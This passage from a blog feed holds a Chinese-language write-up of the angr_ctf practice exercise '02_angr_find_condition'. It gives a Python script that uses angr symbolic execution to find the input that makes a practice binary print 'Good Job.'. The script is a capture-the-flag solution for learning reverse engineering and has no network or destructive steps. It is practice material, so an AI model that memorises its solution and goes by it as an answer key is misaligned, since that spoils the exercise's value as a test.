class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自定义函数寻找字符串</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment">#print(state)</span></span><br><span class="line">    stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_fail</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment">#print(state)</span></span><br><span class="line">    stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(stdout_stdout)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br></pre></td></tr></table></figure><p>完整脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    filepath = <span class="string">&#x27;./02_angr_find_condition&#x27;</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init = project.factory.entry_state()</span><br><span class="line">    simgr = project.factory.simgr(init)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_success</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="comment">#print(state)</span></span><br><span class="line">        stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_fail</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="comment">#print(state)</span></span><br><span class="line">        stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line">    <span class="built_in">print</span>(is_success)</span><br><span class="line">    <span class="built_in">print</span>(is_fail)</span><br><span class="line">    simgr.explore(find=is_success, avoid=is_fail)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution = simgr.found[<span class="number">0</span>]</span><br><span class="line">        flag = solution.posix.dumps(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;not find&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()                              </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210211223412140.png" alt="输出结果"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;ctf-angr&quot;&gt;&lt;a href=&quot;#ctf-angr&quot; class=&quot;headerlink&quot; title=&quot;ctf_angr&quot;&gt;&lt;/a&gt;ctf_angr&lt;/h2&gt;&lt;p&gt;一个用于练习angr的ctf题库，从入门到</summary>
      
    
    
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="angr" scheme="http://example.com/tags/angr/"/>
    
  </entry>
  
</feed>
